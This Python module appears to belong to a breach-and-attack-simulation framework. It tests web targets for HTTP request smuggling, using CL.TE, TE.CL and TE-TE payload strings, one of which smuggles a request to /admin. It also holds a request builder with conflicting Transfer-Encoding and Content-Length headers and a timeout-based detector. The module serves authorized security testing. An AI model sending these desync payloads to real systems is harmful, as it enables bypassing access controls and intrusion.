"""HTTP Request Smuggling testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

SMUGGLING_PAYLOADS = [
    "CL-TE:0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "TE-CL:Transfer-Encoding: chunked\r\n\r\n5\r\nGPOST\r\n0\r\n\r\n",
    "TE-TE:Transfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\n",
]

class RequestSmugglingModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="request_smuggling", description="HTTP request smuggling (CL.TE, TE.CL)", category="request_smuggling",
            mitre_technique_ids=["T1190"], mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.STANDARD, owasp_category="A05:2021 - Security Misconfiguration",
            cwe_ids=["CWE-444"], tags=["smuggling", "desync", "http"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        return SMUGGLING_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        for p in payloads:
            technique = p.split(":")[0]
            requests.append(AttackRequest(request_id=f"smug-{uuid.uuid4().hex[:8]}", target=target,
                method="POST", path=options.get("path", "/"), body="G",
                headers={"Transfer-Encoding": "chunked", "Content-Length": "6", "X-BAS-Technique": technique}))
        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        if response.status_code in (200, 400) and response.elapsed_ms > 10000:
            return ModuleResult(module_name="request_smuggling", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence=f"Request smuggling: timeout detected ({response.elapsed_ms:.0f}ms)",
                severity="high", mitre_technique_id="T1190")
        return ModuleResult(module_name="request_smuggling", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
